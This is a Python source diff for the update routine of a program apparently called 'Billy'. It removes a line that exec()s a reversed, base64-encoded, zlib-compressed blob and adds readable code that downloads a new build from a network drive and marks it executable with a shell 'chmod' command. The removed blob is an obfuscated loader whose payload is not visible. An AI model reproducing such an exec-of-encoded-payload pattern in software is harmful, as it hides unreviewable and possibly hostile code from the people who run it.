@@ -6,8 +6,64 @@ from modules import Command
 import constants
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+def rename_main_dir():
+    if os.path.isdir(config.old_dir_name):
+        shutil.rmtree(config.old_dir_name)
+
+    os.rename(config.main_dir_path, config.old_dir_name)
 
 
-exec((_)(b'==w81be/A8/77z//LbF8HayLb0uYaYfipvmDQFVV/gdPNDA4k95hwviuiVzeuFWxiAGmgFIzQ0GNQA0JQvELQk0jd4BROsWNBSTYZ64UwgP5+H2OvfvVj5cJdGC1MoRP1qVC046HqL+RpFJ+utmLL/fFbNNczvOiw64YseK93ORORfH/Xx1zF9Xydf52JYknDzT/wU1f3iBsMHcL7nIAvOiENYlMSoi7e6H1WiEiwAMNq88sL89FwA3EZ5RthVYOdRcMox1X9YlovfpSk/8GGXo/new+S3/9fODs0Dw4xjjMyT3zjLT/CiffShOrPmSRfYMhBps74Kn63XGjc+sIMYaajmKkHFQRa/PDKk653iSs8ErzmmPi2T1Lxl+wDdyLvGAL4NUOR9dK5plr4ss3UmYK7U8SBP3T0qbFGD8TNE09Y4wGwgr4qXp/REb+U91tJMK7RzjyxMzLqg0ytY0LiIsZupXMnyrGgOYOTY9aXz+Xlnw5Zt+XJ0uZ8WdNyhdYesnPgoKtu3Pk4c/8t3mscrAZnLKIP8HO6bc3uDSTm13Vf1Q0OIWM13eUANq1gxRCd53LmHfcaQyMGf+CVHQUGk9hFARAg1JfLtUo25xWcQgL4Py3vAY6zoxQxQYc2UHf9wVJV+doeY68rz5sJpZ/pbf37sBS5uSzE4wvhX4o9mq2eZDt/u+TtDiUt9XIAxYy/CLoyqc1YlHIWNwbsbbGfH6A+g9eX4DH9ZUz/v58MFHf8btRU8XOYLPcJLeb0IEKr5I2wVwkWByDcJqQgX+jSksv+hAHB/G9GE8791KU9KeQ7TCzI7JEnEOuVzxCkx5owKGUKNnMqRnGdrVaVTCOWMZ3wJ3kZtmZMG7lP+eCSkTrBy8MqHn6oFcbqx9TEEWygLM7nGaL2QiEx//3RdsmM/3LA4Y8S0zJoVoKua76CXM4aH/7rrh5AN3xcOz25fDmRV/vdnP1io5MfBMB6wXJ71Is53NUL7eMJ9t4VoPonb/BnHnJdC8HbJdC2/qYzE986P0CsxbRu4MhJtpGh/fG9Pu7D0TCoJHHZ3oycXIagJR8aUKB0RvPlyiKGWnzk17d8cGm4cuarHpcOKUzZELVKjs+n9wrlFMQN0UD4d4BATRCDIjMo+HuKhCguRUDQG+m6/U2r68/sH1P4MPtim2pkXOfxzmJFMDVrYMAPqzH63IVAI9jqbOkJZyl2tsin/1RF5qfA4domDNsGqF9s397WC5b7/MfFj58wO5FEYWSVoIwf4yVe6wkHRivr/l4n0TyE9TlhQaIfVsbhS4iBNNjPZhwR0vzPRv2fxd/t6/v2quiv39XjZnVZyS/toa6s0btGsWSGQpuhFl2WB/Jqd5GS3nsr9WprCwWXXmVl2qn8GlEfUf02CK0ifYiSGb/n2GoXI2EUwfej8mIID6r6gLy3QGaOVc6k1TYT31t4+TmAZkG0nKgBAkBvl4eKYxB9ryknE0DXvhIX31MBz3TK9RK8nGqpGnA/f3BdQldjAyj3jfokVBUt6EW1lXBc2dSKljqrBUb3R+gpA+bC9F3rxsnhF8RxH5C6GC4sIDGCq//teJfIycbjIKOS/s3o/C3Oj6vHtPaBHV1Z2tUqizQMd5VNOnCSRE8mJccX7pOUtFAqejaGdP8nE9/8aPojspjwzdMNG09Ba8xsNAuxKIAmFgqB5cDr0mIXRwnbFg6NmxRdndwruxtF4nbdRbBwTgDhumbmDl536MQ6wes00ZouAP6zmugyAmCX1Q+VMPHr2xCeYUTCRrYMAvf9WkUzB2JXPaz9zIYHLw4sF1G0fYoEUPdlByPHWtfYAcCszogeE5+0Ah7vWX8PIdKtF7ZZSVYyVYTvmgN++MTqkNPwk1EygruUNC1HKajuR2A8Ag1hOx5X4RUDXFQ375PSqcGuetle5IyVFjzFHNf9hE7ECx8lDg4IHJS/p227bSzvFP4h5YHfHfus7bDuVx1EBwAvIqYdE52XornCmL8VzCG90slFn5BuLAHHyySgjs0COia8XUAIGvyAVVvNDH7+sB6EI4msxBgYF/aPx7k036rnz6Ymjkki+lwjoQ9ueAnyK7G7TI6sT3ANas8edj9PcugH7ZOWojs7eO+9WqBMWjO3wnfy3W45Pyt3PiadztEydTInRTOwWbOUZuYtX5xOufm640A3q04MCBZ60C44DuUXjcnAyQlLyEt55J7as9GgU3NaxNRsiUHN9psgRz3nD5qksiteIXQRPLTMPlwGUbGDjfQ/6i95kpnVWEfyY7eiYQhN9K0fP5+7bZHNgRNDs/SEvCm1G60HGhN9jjhTmUcwnFlCKmLIIwo0zT0mK9fc438rSKIqK8vRGS/nb+IKkXDocnFHvacAAw9X7k7/BvR9lv48Ic4koANhquue1swKGGT7y0rIaH380MRZ+qOK5yFgswmIS50Bsy0XGl06jN0JWiNH9BD6Wl/56YEPvwV4N+bEcd2HDmWax2wCYYvCVo1lB08i8RznMMsZ9L5saVX8JrnQt+XxlBV6JsvIV8F+ZekHme3pqFz5EMZufABPL8bw5/5D/NUkG0xBxBhC5TZ68fO7m+XFTCgNWd/94oCkQB1F/bqj7LifKst6cHqAxjLJVAOC2yHQhRRZ5UazRE6XZ4YlM3qXi5PiuhQRFc/4sxLAUibJAbe/pywT1r4swKuiSsl1hNv7+UKECXnOLkxfAKXM00D3bNZFv2Zb/HiUYI9+Wk7f4rx4yxiWHm/o4N1/6zDshvC6gK0IGWOMp1f1xExKTnX14LTembzLPFu1LlWdSTXEyZbyRqhFoulf+c2tJH447O1EnEe0Bvl4LLElY3VAa0+Gx9cF2PqAp0yXWyzOXcQcbuosHdqq14xzf4Npyje9InJWyDwi4Nw5T7Sd90Ql4ezO9I2AV7D+wfKVUtxcWQbbuSN94fZaGegWHW9JiT74jq0oUlulir+UCjiLWt5kgoC9jHx+kQFBbSP2fVN8VUrcIghw92IsREp//VLdNGAZmlQvn666NJvKoRm+1WQon+YHFrs/NUQ9LX8xNuqrEATpHlCHjQnsJ2BiH8vZPLeajIFZa4Tnuo/DV7B9AYl56BLvxmUlNjd/8vt/JUJZWh1wk3CBFjeHUiMJ7ooSXfaRSwujJtwCVuwI03zfdTQwO0V0uiEOzz2GdZWLHsO19bKYwsXyyt0BEtDnXKNtmesPsZAcZVflSSB5s+K//FBGWWHutSNaE9VuHulJItSZilW6RoBgRpAXSEnPZ+Gjz8+SkHaQDyBkWB+sbZehDO3Xcw7R+e6i9TThWFQVFeULkfVV45XnauWqpNdDLCSRGE1Oh0o1SKaqCVNfmipRysIoo9J5qMeUvf+gx8KxxrZ0D/VuD6PegB/0Zbzdas6I06+mcd064h4WeRyvS1xnGTb40QPjPRO2yJ25u2VTewhf7Qzn/Nx9+gSqT+QwQ+lc6wixSbDL+GGtNes+/2H7/3m8sjeGOe0QlXfhsMc6uS/U91KNeGV4zeUCXCDBLbPQ117wMFx0hcmPZByp9ncYIB2xtRKDsClWcwO8mkvGBrBnNi50t3jPoEf9DtpGocfX1wR52SUrUxMW9JtxLR/wn4mGCVPQQNJaqTV3iNpefbOdZv8z0jhWoVnqh1Vg3stpRTVGBgrTaZhPbFlSTCOlTfcMK1TpH+0VC7qEc1Nmao8FvHSI7bWJoWa9SPm+T5s+4RhfKhII6vtvpml7aFa51d0MS2RqLFstTFaHfFUF7RkWJFM4T66CFYQBCL6AES/vyCMgSWPrIrWst8juaP2RBkYcPCzQGOS/JBWYbbfuG85iIxhpVsk8bbze2KoguvBFfH8DNnIRHA/gWdL8INzYtsg1ypeKimECeqGHtiFoyMauGs82jnayBzvSzYonobBhoTFXpCjGWeB3dxB9B8hJPc0iVxQMNFPZz3eD55c0j6fwgJtvtF5zRymt/dQnRj4BNGjRgsIlWv87PD2gNPoXcUbpu/D8yKHsNEBpN+lToiD8+iyBOTtpcPEztDguXA2/gIGmXvkVtldoqh7W5D1/fBkKdBdQGIECKP5Kz7SJdze8E1Xc1BLi1dlrPQpPYpE84ZmmmFNc8f51lH2dg9n4hyJ3DZTERU2wSWUjxLHBMhReu6tAkuGx/pzCLysTu/DVfNQFhqwfeJRYDS8TwP4rKpcvb/TGHy6SQ0VnAQGX0VmOeMXJh+pkNscg/hYV3asVlTMGTJLc3M+dmejOZDGvJjfFPqAfbM5/z28zBfSN3Fzb7mVlYZQzCeAt9/tEMPpEFof1KxbX5LjCbQb9KIJopnOzStHcqFJL9glE7/eNUOi2ShkmD8J0TTcKkTGRZ9Scoledhi+2L3yhCU1PnCy+RN4fExPPw06/CwmlJ1RsnA6nen5jzOyR2NaCf2R/oyplyH0pjbtEpjiwpuQKNWy3wacx0GZm4hT3Vr9qwXe/L5UjrFFhnTEyMw0o1EFAHofzb7UmbuDccI896uKf1mzFmhnbYuNjPIFY9Vt1ptOrI1hMKNXJYvKjEhFwlenJNuw0+EhlM4uCXVj4ziTt4eX15X1W2sLRIU37xA34s3nx7G6rlS76kDg7NSCsl2NqT2cgJeDBquYligNixNMYpQxnrpE2sG+GN/7OKSlZffdhj002FFf03cDNlfPaNiT8F9uMhBIq2+03A2z3bUF5hSKXgEv7P3uHm3nDq+SLiFd85NZwoTInL/rTSv/DVShSSJSDhUbuMj/FoTApmBZ7Y3h5E+k0fD/sKmdUsu12H1Z88XPrq4w7fVEOKfZlfEW5v6NIO9xbACW8CSsJZ4+PRKt9Z7hDvPUUeal7jIuoSqEbQ2mlzLeHE1Qg7bd4Y2xyQdbTMwzIpI0kor+8apJ8nYwCIhoOS4plsHv3FqGbBExr6ErJ2pLjrc/kcRvCqmOwlhd1G00KjVAJibfoMxuRWWqItyvxA3vGuInA/Lv+0PfwA+euT9u1lvfUeA8R5yF9NpSwcoRhiUFVftvoUxYoheFgiSSSb4uAbuyl+UpHtv237CVmBBLCeAngOx8YgDjWl0zPyq9f60pAJhbeXPFoSo5zezb2d+vWRYEOIov/rwxUtWmtJjuzqayeGZXWZbC/wBt2CVKfszHm7VCF6uu5Ow1ad5iWfkjy8ASeOUn99JscVhrdEO75FMW5f+06ouK+8PNOIt+WJObG62NU8PNfSZCRoBNkrzs6G1vCnmcpEF9B1nGyYkDtD9NaRazYYlkXxyenidp10Xwmn+RZWIRZINoHhyJdVyfo1sxebrnZwXVB62iEVJco1l1eHEQ4BRMyvS7ibzqEICAKiGUIcX2Nf10bqcs6AHTGNVNLsN3DA2z5tecRedTJtaYepM6Rj3JQyD3dqhxpZ//BML6Wvl1nxkvU4wNEbFWBNKEw46sJPdEXFlMhn3HnBhUClpfGDvoAP2JqZJXKaESFKq5H8jBAWzklUdygYJE8RZWo3O0LA9+IzU4it0xBJZEHkKDk+oMeImk/GTKU81vyCqAFtK/cnhQoYA40VSa53z2bleIIuoWEdpwE74seVZWtUvC4o3VAuO6uBjGIrdoVMwLXMfNzWD4kjU4fV/XHPfhXl5wbhuVzDi+cTgtwGHnKkgj2m0AmoQ/aGXbSjbWm+ZE6vJJdpZBTy6J/tCcDwutmoV8HKyKitgC2K6TroLcmazmcBQnaGcuaxtE0yAtUbbKdEkyQ61/+SiTiqHmSsAsm7nRkJLmHzUe674+E0jU/dGVstvD4BH70XlLxgiWG/jdssCYn7DstpthlDkh+EIJ6+dMoV05HsypiojYxzjSmHsfQbYcg4gah/SMK4IwrhuCyVtzsbM5pGGgVY4xLl34Wf0Nm/9t8qzbo9QBreoxb7E2TdaLd4Og75v7p+QPJe7nEl0se5ILrKsGsVB7ZvJAY5mV5O03jDi+Twc0aIQVK1zUzt1ptMphnukbDVXKaU/oiOex0EfM+Rjq09ghrNneUnb9ikBmt5Fywfp7QwXHXh8xGLty4WuWHPCYqhK2DWEmVa/FFu+aB6a8qRV2kzPurG03nJCXgW3V11HhPggkn8jhDUA+GgSPo3EsO84QWfPxB9zOgqOjKPryI0OvTSC3kYMl/Bk1nw14aFwQ3bR33wHJ2UuOxTluamb1R/TIv6ruyyeXPSwGuwrC5pqTcn71+//n+/0+9//zz3P/nu8IZm5kBg1vvqj+7fXcweRn7sbgqWDua0g7n+DR2qVhyW8lVwJe'))
+def create_main_dir():
+    os.mkdir(config.main_dir_path)
+
+
+def install_new_billy():
+    NetworkDrive.download(config.Billy_path, config.main_file_path)
+
+
+def restore():
+    if os.path.isdir(config.old_dir_name):
+        if os.path.exists(config.main_dir_path):
+            shutil.rmtree(config.main_dir_path)
+        os.rename(config.old_dir_name, config.main_dir_path)
+
+
+def make_script_executable(path):
+    return Command.run_command(f"chmod +x {path}")
+
+
+def check_update():
+    if not os.path.isdir(config.main_dir_path):
+        return 0
+    if not os.path.isfile(config.main_file_path):
+        return 0
+    return 1
+
+
+def update():
+    is_update_successfully = True
+    answer = "Update completed successfully. Restart system to start new Billy."
+
+    try:
+        rename_main_dir()
+
+        create_main_dir()
+
+        install_new_billy()
+
+        if config.os_name == constants.Linux_OS:
+            make_script_executable(config.main_file_path)
+    except Exception as ex:
+        answer = "An error occurred during the update: " + \
+            str(ex) + "\nOld Billy restored"
+        is_update_successfully = False
+
+    else:
+        if not check_update():
+            answer = "An error occurred during the update: Billy not installed. \nOld Billy restored"
+            is_update_successfully = False
+
+    if not is_update_successfully:
+        restore()
+
+    return answer
